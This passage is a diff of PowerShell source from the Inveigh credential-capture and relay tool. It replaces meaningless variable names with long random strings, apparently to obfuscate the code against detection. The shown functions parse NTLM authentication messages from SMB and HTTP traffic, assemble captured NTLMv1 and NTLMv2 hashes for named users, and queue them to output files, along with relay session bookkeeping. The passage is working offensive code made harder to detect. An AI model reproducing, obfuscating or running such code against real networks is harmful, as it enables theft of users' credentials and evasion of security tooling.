+            $RCwIBkMHHWDnJkpbTUzbmnVUjDkqM = ($MwxuvtEARzqfzSacpfYTQcjATMfvfFMAcf + "@" + $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.domain_mapping_table.$ftdOWSOcDehtsWbWJMmkJCJyNuiNOXANQcrKTay).ToUpper()
+            $rlTUkRDbXjxiFAKbytfonbqpGvtqIpggdJyrPvQvNjRb = ($eRGbKjnZUhrTKuiBJynaeNWyTRyZVMwVtclTp + "." + $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.domain_mapping_table.$ftdOWSOcDehtsWbWJMmkJCJyNuiNOXANQcrKTay).ToUpper()
         }
         else
         {
-            $RejectFast = $DesireUnique + "\" + $StuffDark
+            $RCwIBkMHHWDnJkpbTUzbmnVUjDkqM = $ftdOWSOcDehtsWbWJMmkJCJyNuiNOXANQcrKTay + "\" + $MwxuvtEARzqfzSacpfYTQcjATMfvfFMAcf
         }
 
-        for($ColorReply = 0;$ColorReply -lt $LightOval.enumerate.Count;$ColorReply++)
+        for($vfvDllDKJdYKKWFSzYEB = 0;$vfvDllDKJdYKKWFSzYEB -lt $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate.Count;$vfvDllDKJdYKKWFSzYEB++)
         {
 
-            if($LightOval.enumerate[$ColorReply].Hostname -eq $LoveEggs -or $LightOval.enumerate[$ColorReply].IP -eq $SmashDolls)
+            if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate[$vfvDllDKJdYKKWFSzYEB].Hostname -eq $rlTUkRDbXjxiFAKbytfonbqpGvtqIpggdJyrPvQvNjRb -or $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate[$vfvDllDKJdYKKWFSzYEB].IP -eq $vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS)
             {
 
-                if(!$LightOval.enumerate[$ColorReply].Hostname)
+                if(!$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate[$vfvDllDKJdYKKWFSzYEB].Hostname)
                 {
-                    $LightOval.enumerate[$SuperRigid].Hostname = $LoveEggs
+                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate[$PyLvgcFDMbdgmgwWIstwEqhjQofsgrvvWavRILddNjx].Hostname = $rlTUkRDbXjxiFAKbytfonbqpGvtqIpggdJyrPvQvNjRb
                 }
 
-                [Array]$SmallRoyal = $LightOval.enumerate[$ColorReply].Sessions
+                [Array]$eiGtHTDNvfEdvCsCSuvHTCQxBBUBnulKBNwcxw = $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate[$vfvDllDKJdYKKWFSzYEB].Sessions
 
-                if($LightOval.domain_mapping_table.$DesireUnique)
+                if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.domain_mapping_table.$ftdOWSOcDehtsWbWJMmkJCJyNuiNOXANQcrKTay)
                 {
 
-                    for($WindyEarth = 0;$WindyEarth -lt $SmallRoyal.Count;$WindyEarth++)
+                    for($BzFGkMlyRCBJPIhnmBAAarEIcObHct = 0;$BzFGkMlyRCBJPIhnmBAAarEIcObHct -lt $eiGtHTDNvfEdvCsCSuvHTCQxBBUBnulKBNwcxw.Count;$BzFGkMlyRCBJPIhnmBAAarEIcObHct++)
                     {
 
-                        if($SmallRoyal[$WindyEarth] -like "$DesireUnique\*")
+                        if($eiGtHTDNvfEdvCsCSuvHTCQxBBUBnulKBNwcxw[$BzFGkMlyRCBJPIhnmBAAarEIcObHct] -like "$ftdOWSOcDehtsWbWJMmkJCJyNuiNOXANQcrKTay\*")
                         {
-                            $BoredObject = ($SmallRoyal[$WindyEarth].Split("\"))[1]
-                            $DirtUnpack = $BoredObject + "@" + $LightOval.domain_mapping_table.$DesireUnique
-                            $SmallRoyal[$WindyEarth] += $DirtUnpack
-                            $LightOval.enumerate[$ColorReply].Sessions = $SmallRoyal
+                            $WJWvWHlYGcfvAybcBqQDETSccAPpSEM = ($eiGtHTDNvfEdvCsCSuvHTCQxBBUBnulKBNwcxw[$BzFGkMlyRCBJPIhnmBAAarEIcObHct].Split("\"))[1]
+                            $WbZuZgFMEDYgOplzuTYmXHEKGfVgVT = $WJWvWHlYGcfvAybcBqQDETSccAPpSEM + "@" + $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.domain_mapping_table.$ftdOWSOcDehtsWbWJMmkJCJyNuiNOXANQcrKTay
+                            $eiGtHTDNvfEdvCsCSuvHTCQxBBUBnulKBNwcxw[$BzFGkMlyRCBJPIhnmBAAarEIcObHct] += $WbZuZgFMEDYgOplzuTYmXHEKGfVgVT
+                            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate[$vfvDllDKJdYKKWFSzYEB].Sessions = $eiGtHTDNvfEdvCsCSuvHTCQxBBUBnulKBNwcxw
                         }
 
                     }
 
                 }
 
-                if($SmallRoyal -notcontains $RejectFast)
+                if($eiGtHTDNvfEdvCsCSuvHTCQxBBUBnulKBNwcxw -notcontains $RCwIBkMHHWDnJkpbTUzbmnVUjDkqM)
                 {
-                    $SmallRoyal += $RejectFast
-                    $LightOval.enumerate[$ColorReply].Sessions = $SmallRoyal
+                    $eiGtHTDNvfEdvCsCSuvHTCQxBBUBnulKBNwcxw += $RCwIBkMHHWDnJkpbTUzbmnVUjDkqM
+                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate[$vfvDllDKJdYKKWFSzYEB].Sessions = $eiGtHTDNvfEdvCsCSuvHTCQxBBUBnulKBNwcxw
                 }
 
-                $MixBed = $true
+                $SaBBCrSCAbWNFqKnzshsb = $true
                 break
             }
 
         }
      
-        if(!$MixBed)
+        if(!$SaBBCrSCAbWNFqKnzshsb)
         {
-            $LightOval.enumerate.Add((New-RelayEnumObject -SmashDolls $SmashDolls -OrderSteam $LoveEggs -RainyShave $RejectFast)) > $null
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate.Add((New-RelayEnumObject -vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS $vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS -eRGbKjnZUhrTKuiBJynaeNWyTRyZVMwVtclTp $rlTUkRDbXjxiFAKbytfonbqpGvtqIpggdJyrPvQvNjRb -JRPFnfKvazFOZaFuyEmuboVRJBxuGr $RCwIBkMHHWDnJkpbTUzbmnVUjDkqM)) > $null
         }
 
     }
@@ -1602,178 +1602,178 @@ $LivelySqueak =
 }
 
 # Microsoft".
-$UppitySheep =
+$CbdNUtPgouuAVLJbCTRwuCSvAEcXQqwskA =
 {
 
     function Get-NTLMResponse
     {
-        param ([Byte[]]$MuscleRatty,[String]$MilkyRush,[String]$RiddlePizzas,[String]$HollowThick,[String]$SlipPorter,[String]$ClassySquash)
+        param ([Byte[]]$zPlYIjTPqoNZzSUhtaTw,[String]$yKoSzUCBsnNMkZzkauDhdNYLmkcCMYSOuLnYZBQOfG,[String]$eNxwacaDJketGfaRHfQquIMMhYoskbVA,[String]$cjZpBGhKUHaTEXIBrvNWUB,[String]$lyBceglOUxojIJcWfJXdIrHkrTxJoyYtvaYwJcHIJ,[String]$KjgVwuAzvAqgflsiyLKEOOdznSLkaIokq)
 
-        $BabyVoice = [System.BitConverter]::ToString($MuscleRatty)
-        $BabyVoice = $BabyVoice -replace "-",""
-        $SlowFork = $BabyVoice.IndexOf("4E544C4D53535000")
-        $RejectFast = "$RiddlePizzas`:$HollowThick"
+        $ZszcaHKLNuouWZXGbNkptXrTNJqgKx = [System.BitConverter]::ToString($zPlYIjTPqoNZzSUhtaTw)
+        $ZszcaHKLNuouWZXGbNkptXrTNJqgKx = $ZszcaHKLNuouWZXGbNkptXrTNJqgKx -replace "-",""
+        $OWKGZPllWyNbnRYcYpVYilVbdvxgmWihBbi = $ZszcaHKLNuouWZXGbNkptXrTNJqgKx.IndexOf("4E544C4D53535000")
+        $RCwIBkMHHWDnJkpbTUzbmnVUjDkqM = "$eNxwacaDJketGfaRHfQquIMMhYoskbVA`:$cjZpBGhKUHaTEXIBrvNWUB"
 
-        if($SlowFork -ge 0 -and $BabyVoice.SubString(($SlowFork + 16),8) -eq "03000000")
+        if($OWKGZPllWyNbnRYcYpVYilVbdvxgmWihBbi -ge 0 -and $ZszcaHKLNuouWZXGbNkptXrTNJqgKx.SubString(($OWKGZPllWyNbnRYcYpVYilVbdvxgmWihBbi + 16),8) -eq "03000000")
         {
-            $ThrillWise = $SlowFork / 2
-            $CornVulgar = Get-UInt16DataLength ($ThrillWise + 12) $MuscleRatty
-            $FootCaring = Get-UInt32DataLength ($ThrillWise + 16) $MuscleRatty
-            $YamKettle = [System.BitConverter]::ToString($MuscleRatty[($ThrillWise + $FootCaring)..($ThrillWise + $FootCaring + $CornVulgar - 1)]) -replace "-",""
-            $LastCrabby = Get-UInt16DataLength ($ThrillWise + 20) $MuscleRatty
-            $CrateBite = Get-UInt32DataLength ($ThrillWise + 24) $MuscleRatty
-            $ServeLamp = [System.BitConverter]::ToString($MuscleRatty[($ThrillWise + $CrateBite)..($ThrillWise + $CrateBite + $LastCrabby - 1)]) -replace "-",""
-            $GateWorry = Get-UInt16DataLength ($ThrillWise + 28) $MuscleRatty
-            $LooseHammer = Get-UInt32DataLength ($ThrillWise + 32) $MuscleRatty
+            $vLcQktViHRyfnBKrCMGYcrPExsvm = $OWKGZPllWyNbnRYcYpVYilVbdvxgmWihBbi / 2
+            $LNSzSyBsIsObzoQrxXtrpkSpOoDNTpkqtN = Get-UInt16DataLength ($vLcQktViHRyfnBKrCMGYcrPExsvm + 12) $zPlYIjTPqoNZzSUhtaTw
+            $ItHyyTAoXcHSsGIoxRqDHpFdSfxXPTUk = Get-UInt32DataLength ($vLcQktViHRyfnBKrCMGYcrPExsvm + 16) $zPlYIjTPqoNZzSUhtaTw
+            $fJpTrwFrhazmDlyrTERocolutBONGCtNCQyz = [System.BitConverter]::ToString($zPlYIjTPqoNZzSUhtaTw[($vLcQktViHRyfnBKrCMGYcrPExsvm + $ItHyyTAoXcHSsGIoxRqDHpFdSfxXPTUk)..($vLcQktViHRyfnBKrCMGYcrPExsvm + $ItHyyTAoXcHSsGIoxRqDHpFdSfxXPTUk + $LNSzSyBsIsObzoQrxXtrpkSpOoDNTpkqtN - 1)]) -replace "-",""
+            $haAjbFEHHgIQIbuDsngztk = Get-UInt16DataLength ($vLcQktViHRyfnBKrCMGYcrPExsvm + 20) $zPlYIjTPqoNZzSUhtaTw
+            $bDBccGGMFIqLhTZLkCrAwLUPqncaDnwhuheD = Get-UInt32DataLength ($vLcQktViHRyfnBKrCMGYcrPExsvm + 24) $zPlYIjTPqoNZzSUhtaTw
+            $hBTKYXJzESmGWVttjiOEfVnFEbLLwKN = [System.BitConverter]::ToString($zPlYIjTPqoNZzSUhtaTw[($vLcQktViHRyfnBKrCMGYcrPExsvm + $bDBccGGMFIqLhTZLkCrAwLUPqncaDnwhuheD)..($vLcQktViHRyfnBKrCMGYcrPExsvm + $bDBccGGMFIqLhTZLkCrAwLUPqncaDnwhuheD + $haAjbFEHHgIQIbuDsngztk - 1)]) -replace "-",""
+            $uWUzkktFJcQmlIKdQULiKPYxHiDGmSMDqxTb = Get-UInt16DataLength ($vLcQktViHRyfnBKrCMGYcrPExsvm + 28) $zPlYIjTPqoNZzSUhtaTw
+            $mHchXDvBzkcrpBYiIajESeAv = Get-UInt32DataLength ($vLcQktViHRyfnBKrCMGYcrPExsvm + 32) $zPlYIjTPqoNZzSUhtaTw
 
-            if($GateWorry -gt 0)
+            if($uWUzkktFJcQmlIKdQULiKPYxHiDGmSMDqxTb -gt 0)
             {
-                $BrushSuck = Convert-DataToString ($ThrillWise + $LooseHammer) $GateWorry $MuscleRatty
+                $ZpnLVmwNsGclFFvEWrMnTIZiSnNo = Convert-DataToString ($vLcQktViHRyfnBKrCMGYcrPExsvm + $mHchXDvBzkcrpBYiIajESeAv) $uWUzkktFJcQmlIKdQULiKPYxHiDGmSMDqxTb $zPlYIjTPqoNZzSUhtaTw
             }
 
-            $StitchShiver = Get-UInt16DataLength ($ThrillWise + 36) $MuscleRatty
-            $MournScrew = Get-UInt32DataLength ($ThrillWise + 40) $MuscleRatty
-            $BestFluffy = Convert-DataToString ($ThrillWise + $MournScrew) $StitchShiver $MuscleRatty
-            $GrayLove = Get-UInt16DataLength ($ThrillWise + 44) $MuscleRatty
-            $FoodStingy = Get-UInt32DataLength ($ThrillWise + 48) $MuscleRatty
-            $TryHole = Convert-DataToString ($ThrillWise + $FoodStingy) $GrayLove $MuscleRatty
+            $RIaohyeBhnwYBjkHPnAOWSGkxOQMhpZc = Get-UInt16DataLength ($vLcQktViHRyfnBKrCMGYcrPExsvm + 36) $zPlYIjTPqoNZzSUhtaTw
+            $hRpTOPyNfcDiPbsGHxPC = Get-UInt32DataLength ($vLcQktViHRyfnBKrCMGYcrPExsvm + 40) $zPlYIjTPqoNZzSUhtaTw
+            $ifeLVhWLzSJcyRyKCvFFmcnO = Convert-DataToString ($vLcQktViHRyfnBKrCMGYcrPExsvm + $hRpTOPyNfcDiPbsGHxPC) $RIaohyeBhnwYBjkHPnAOWSGkxOQMhpZc $zPlYIjTPqoNZzSUhtaTw
+            $YjSwgpbYWSjnMVdWnlMVTBpLAzoJVTwTqOFdBG = Get-UInt16DataLength ($vLcQktViHRyfnBKrCMGYcrPExsvm + 44) $zPlYIjTPqoNZzSUhtaTw
+            $NobEPfWSjuzedjMraKfatKTRK = Get-UInt32DataLength ($vLcQktViHRyfnBKrCMGYcrPExsvm + 48) $zPlYIjTPqoNZzSUhtaTw
+            $hHVgAJWodJrXiWnhRSOAYhHrcPiGogI = Convert-DataToString ($vLcQktViHRyfnBKrCMGYcrPExsvm + $NobEPfWSjuzedjMraKfatKTRK) $YjSwgpbYWSjnMVdWnlMVTBpLAzoJVTwTqOFdBG $zPlYIjTPqoNZzSUhtaTw
 
-            if($ClassySquash -eq "SMB")
+            if($KjgVwuAzvAqgflsiyLKEOOdznSLkaIokq -eq "SMB")
             {
-                $EggsExist = $LightOval.SMB_session_table.$RejectFast
+                $eXAKzprnnPiPECgCmrSMRcuHgJGyqXtOjE = $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.SMB_session_table.$RCwIBkMHHWDnJkpbTUzbmnVUjDkqM
             }
             else
             {
-                $EggsExist = $LightOval.HTTP_session_table.$RejectFast
+                $eXAKzprnnPiPECgCmrSMRcuHgJGyqXtOjE = $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.HTTP_session_table.$RCwIBkMHHWDnJkpbTUzbmnVUjDkqM
             }
             
-            if($LastCrabby -gt 24)
+            if($haAjbFEHHgIQIbuDsngztk -gt 24)
             {
 
-                if($EggsExist)
+                if($eXAKzprnnPiPECgCmrSMRcuHgJGyqXtOjE)
                 {
 
-                    $SmoggyParty = $ServeLamp.Insert(32,':')
-                    $BasinSalt = $BestFluffy + "::" + $BrushSuck + ":" + $EggsExist + ":" + $SmoggyParty
+                    $grkIGcSeYhKuwOvgtfqXxBaBWeKGtcgcZnEOvaQxoiF = $hBTKYXJzESmGWVttjiOEfVnFEbLLwKN.Insert(32,':')
+                    $ILNwSGLvrbIgLzljyoXZpgKoYZidt = $ifeLVhWLzSJcyRyKCvFFmcnO + "::" + $ZpnLVmwNsGclFFvEWrMnTIZiSnNo + ":" + $eXAKzprnnPiPECgCmrSMRcuHgJGyqXtOjE + ":" + $grkIGcSeYhKuwOvgtfqXxBaBWeKGtcgcZnEOvaQxoiF
 
-                    if($MilkyRush -eq 'Y')
+                    if($yKoSzUCBsnNMkZzkauDhdNYLmkcCMYSOuLnYZBQOfG -eq 'Y')
                     {
 
-                        if($LightOval.machine_accounts -or (!$LightOval.machine_accounts -and -not $BestFluffy.EndsWith('$')))
+                        if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.machine_accounts -or (!$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.machine_accounts -and -not $ifeLVhWLzSJcyRyKCvFFmcnO.EndsWith('$')))
                         {
-                            $LightOval.NTLMv2_list.Add($BasinSalt) > $null
+                            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv2_list.Add($ILNwSGLvrbIgLzljyoXZpgKoYZidt) > $null
 
-                            if(!$LightOval.console_unique -or ($LightOval.console_unique -and $LightOval.NTLMv2_username_list -notcontains "$RiddlePizzas $BrushSuck\$BestFluffy"))
+                            if(!$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_unique -or ($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_unique -and $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv2_username_list -notcontains "$eNxwacaDJketGfaRHfQquIMMhYoskbVA $ZpnLVmwNsGclFFvEWrMnTIZiSnNo\$ifeLVhWLzSJcyRyKCvFFmcnO"))
                             {
-                                $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] $ClassySquash($SlipPorter) NTLMv2 captured for $BrushSuck\$BestFluffy from $RiddlePizzas($TryHole)`:$HollowThick`:") > $null
-                                $LightOval.output_queue.Add($BasinSalt) > $null
+                                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] [$(Get-Date -format s)] $KjgVwuAzvAqgflsiyLKEOOdznSLkaIokq($lyBceglOUxojIJcWfJXdIrHkrTxJoyYtvaYwJcHIJ) NTLMv2 captured for $ZpnLVmwNsGclFFvEWrMnTIZiSnNo\$ifeLVhWLzSJcyRyKCvFFmcnO from $eNxwacaDJketGfaRHfQquIMMhYoskbVA($hHVgAJWodJrXiWnhRSOAYhHrcPiGogI)`:$cjZpBGhKUHaTEXIBrvNWUB`:") > $null
+                                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add($ILNwSGLvrbIgLzljyoXZpgKoYZidt) > $null
                             }
                             else
                             {
-                                $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] $ClassySquash($SlipPorter) NTLMv2 captured for $BrushSuck\$BestFluffy from $RiddlePizzas($TryHole)`:$HollowThick`:`n[not unique]") > $null
+                                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] [$(Get-Date -format s)] $KjgVwuAzvAqgflsiyLKEOOdznSLkaIokq($lyBceglOUxojIJcWfJXdIrHkrTxJoyYtvaYwJcHIJ) NTLMv2 captured for $ZpnLVmwNsGclFFvEWrMnTIZiSnNo\$ifeLVhWLzSJcyRyKCvFFmcnO from $eNxwacaDJketGfaRHfQquIMMhYoskbVA($hHVgAJWodJrXiWnhRSOAYhHrcPiGogI)`:$cjZpBGhKUHaTEXIBrvNWUB`:`n[not unique]") > $null
                             }
 
-                            if($LightOval.file_output -and (!$LightOval.file_unique -or ($LightOval.file_unique -and $LightOval.NTLMv2_username_list -notcontains "$RiddlePizzas $BrushSuck\$BestFluffy")))
+                            if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.file_output -and (!$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.file_unique -or ($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.file_unique -and $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv2_username_list -notcontains "$eNxwacaDJketGfaRHfQquIMMhYoskbVA $ZpnLVmwNsGclFFvEWrMnTIZiSnNo\$ifeLVhWLzSJcyRyKCvFFmcnO")))
                             {
-                                $LightOval.NTLMv2_file_queue.Add($BasinSalt) > $null
-                                $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $ClassySquash($SlipPorter) NTLMv2 written to " + "Inveigh-WishMetal.txt") > $null
+                                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv2_file_queue.Add($ILNwSGLvrbIgLzljyoXZpgKoYZidt) > $null
+                                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[!] [$(Get-Date -format s)] $KjgVwuAzvAqgflsiyLKEOOdznSLkaIokq($lyBceglOUxojIJcWfJXdIrHkrTxJoyYtvaYwJcHIJ) NTLMv2 written to " + "Inveigh-wrjRNTpkoQfiiqptAqvnnh.txt") > $null
                             }
 
-                            if($LightOval.NTLMv2_username_list -notcontains "$RiddlePizzas $BrushSuck\$BestFluffy")
+                            if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv2_username_list -notcontains "$eNxwacaDJketGfaRHfQquIMMhYoskbVA $ZpnLVmwNsGclFFvEWrMnTIZiSnNo\$ifeLVhWLzSJcyRyKCvFFmcnO")
                             {
-                                $LightOval.NTLMv2_username_list.Add("$RiddlePizzas $BrushSuck\$BestFluffy") > $null
+                                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv2_username_list.Add("$eNxwacaDJketGfaRHfQquIMMhYoskbVA $ZpnLVmwNsGclFFvEWrMnTIZiSnNo\$ifeLVhWLzSJcyRyKCvFFmcnO") > $null
                             }
 
-                            if($LightOval.IP_capture_list -notcontains $RiddlePizzas -and -not $BestFluffy.EndsWith('$') -and !$LightOval.spoofer_repeat -and $RiddlePizzas -ne $SmashDolls)
+                            if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.IP_capture_list -notcontains $eNxwacaDJketGfaRHfQquIMMhYoskbVA -and -not $ifeLVhWLzSJcyRyKCvFFmcnO.EndsWith('$') -and !$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.spoofer_repeat -and $eNxwacaDJketGfaRHfQquIMMhYoskbVA -ne $vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS)
                             {
-                                $LightOval.IP_capture_list.Add($RiddlePizzas) > $null
+                                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.IP_capture_list.Add($eNxwacaDJketGfaRHfQquIMMhYoskbVA) > $null
                             }
 
                         }
                         else
                         {
-                            $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] $ClassySquash($SlipPorter) NTLMv2 ignored for $BrushSuck\$BestFluffy from $RiddlePizzas($TryHole)`:$HollowThick`:`n[machine account]") > $null    
+                            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] [$(Get-Date -format s)] $KjgVwuAzvAqgflsiyLKEOOdznSLkaIokq($lyBceglOUxojIJcWfJXdIrHkrTxJoyYtvaYwJcHIJ) NTLMv2 ignored for $ZpnLVmwNsGclFFvEWrMnTIZiSnNo\$ifeLVhWLzSJcyRyKCvFFmcnO from $eNxwacaDJketGfaRHfQquIMMhYoskbVA($hHVgAJWodJrXiWnhRSOAYhHrcPiGogI)`:$cjZpBGhKUHaTEXIBrvNWUB`:`n[machine account]") > $null    
                         }
 
                     }
                     else
                     {
-                        $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] $ClassySquash($SlipPorter) NTLMv2 ignored for $BrushSuck\$BestFluffy from $RiddlePizzas($TryHole)`:$HollowThick`:`n[capture disabled]") > $null    
+                        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] [$(Get-Date -format s)] $KjgVwuAzvAqgflsiyLKEOOdznSLkaIokq($lyBceglOUxojIJcWfJXdIrHkrTxJoyYtvaYwJcHIJ) NTLMv2 ignored for $ZpnLVmwNsGclFFvEWrMnTIZiSnNo\$ifeLVhWLzSJcyRyKCvFFmcnO from $eNxwacaDJketGfaRHfQquIMMhYoskbVA($hHVgAJWodJrXiWnhRSOAYhHrcPiGogI)`:$cjZpBGhKUHaTEXIBrvNWUB`:`n[capture disabled]") > $null    
                     }
 
                 }
                 else
                 {
-                    $LightOval.output_queue.Add("[-] [$(Get-Date -format s)] $ClassySquash($SlipPorter) NTLMv2 challenge missing for $BrushSuck\$BestFluffy from $RiddlePizzas($TryHole)`:$HollowThick") > $null    
+                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[-] [$(Get-Date -format s)] $KjgVwuAzvAqgflsiyLKEOOdznSLkaIokq($lyBceglOUxojIJcWfJXdIrHkrTxJoyYtvaYwJcHIJ) NTLMv2 challenge missing for $ZpnLVmwNsGclFFvEWrMnTIZiSnNo\$ifeLVhWLzSJcyRyKCvFFmcnO from $eNxwacaDJketGfaRHfQquIMMhYoskbVA($hHVgAJWodJrXiWnhRSOAYhHrcPiGogI)`:$cjZpBGhKUHaTEXIBrvNWUB") > $null    
                 }
 
             }
-            elseif($LastCrabby -eq 24)
+            elseif($haAjbFEHHgIQIbuDsngztk -eq 24)
             {
 
-                if($EggsExist)
+                if($eXAKzprnnPiPECgCmrSMRcuHgJGyqXtOjE)
                 {
 
-                    $CrowdHat = $BestFluffy + "::" + $BrushSuck + ":" + $YamKettle + ":" + $ServeLamp + ":" + $EggsExist
+                    $JvQOACOsoZnunlySHIhQXPnhwSlgTPobSVtiyRjNZBP = $ifeLVhWLzSJcyRyKCvFFmcnO + "::" + $ZpnLVmwNsGclFFvEWrMnTIZiSnNo + ":" + $fJpTrwFrhazmDlyrTERocolutBONGCtNCQyz + ":" + $hBTKYXJzESmGWVttjiOEfVnFEbLLwKN + ":" + $eXAKzprnnPiPECgCmrSMRcuHgJGyqXtOjE
 
-                    if($MilkyRush -eq 'Y')
+                    if($yKoSzUCBsnNMkZzkauDhdNYLmkcCMYSOuLnYZBQOfG -eq 'Y')
                     {
 
-                        if($LightOval.machine_accounts -or (!$LightOval.machine_accounts -and -not $BestFluffy.EndsWith('$')))
+                        if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.machine_accounts -or (!$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.machine_accounts -and -not $ifeLVhWLzSJcyRyKCvFFmcnO.EndsWith('$')))
                         {
-                            $LightOval.NTLMv1_list.Add($CrowdHat) > $null
+                            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv1_list.Add($JvQOACOsoZnunlySHIhQXPnhwSlgTPobSVtiyRjNZBP) > $null
 
-                            if(!$LightOval.console_unique -or ($LightOval.console_unique -and $LightOval.NTLMv1_username_list -notcontains "$RiddlePizzas $BrushSuck\$BestFluffy"))
+                            if(!$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_unique -or ($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_unique -and $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv1_username_list -notcontains "$eNxwacaDJketGfaRHfQquIMMhYoskbVA $ZpnLVmwNsGclFFvEWrMnTIZiSnNo\$ifeLVhWLzSJcyRyKCvFFmcnO"))
                             {
-                                $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] SMB($SlipPorter) NTLMv1 captured for $BrushSuck\$BestFluffy from $RiddlePizzas($TryHole)`:$HollowThick`:") > $null
-                                $LightOval.output_queue.Add($CrowdHat) > $null
+                                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] [$(Get-Date -format s)] SMB($lyBceglOUxojIJcWfJXdIrHkrTxJoyYtvaYwJcHIJ) NTLMv1 captured for $ZpnLVmwNsGclFFvEWrMnTIZiSnNo\$ifeLVhWLzSJcyRyKCvFFmcnO from $eNxwacaDJketGfaRHfQquIMMhYoskbVA($hHVgAJWodJrXiWnhRSOAYhHrcPiGogI)`:$cjZpBGhKUHaTEXIBrvNWUB`:") > $null
+                                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add($JvQOACOsoZnunlySHIhQXPnhwSlgTPobSVtiyRjNZBP) > $null
                             }
                             else
                             {
-                                $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] SMB($SlipPorter) NTLMv1 captured for $BrushSuck\$BestFluffy from $RiddlePizzas($TryHole)`:$HollowThick`:`n[not unique]") > $null
+                                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] [$(Get-Date -format s)] SMB($lyBceglOUxojIJcWfJXdIrHkrTxJoyYtvaYwJcHIJ) NTLMv1 captured for $ZpnLVmwNsGclFFvEWrMnTIZiSnNo\$ifeLVhWLzSJcyRyKCvFFmcnO from $eNxwacaDJketGfaRHfQquIMMhYoskbVA($hHVgAJWodJrXiWnhRSOAYhHrcPiGogI)`:$cjZpBGhKUHaTEXIBrvNWUB`:`n[not unique]") > $null
                             }
 
-                            if($LightOval.file_output -and (!$LightOval.file_unique -or ($LightOval.file_unique -and $LightOval.NTLMv1_username_list -notcontains "$RiddlePizzas $BrushSuck\$BestFluffy")))
+                            if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.file_output -and (!$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.file_unique -or ($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.file_unique -and $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv1_username_list -notcontains "$eNxwacaDJketGfaRHfQquIMMhYoskbVA $ZpnLVmwNsGclFFvEWrMnTIZiSnNo\$ifeLVhWLzSJcyRyKCvFFmcnO")))
                             {
-                                $LightOval.NTLMv1_file_queue.Add($CrowdHat) > $null
-                                $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] SMB($SlipPorter) NTLMv1 written to " + "Inveigh-MarketJuggle.txt") > $null
+                                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv1_file_queue.Add($JvQOACOsoZnunlySHIhQXPnhwSlgTPobSVtiyRjNZBP) > $null
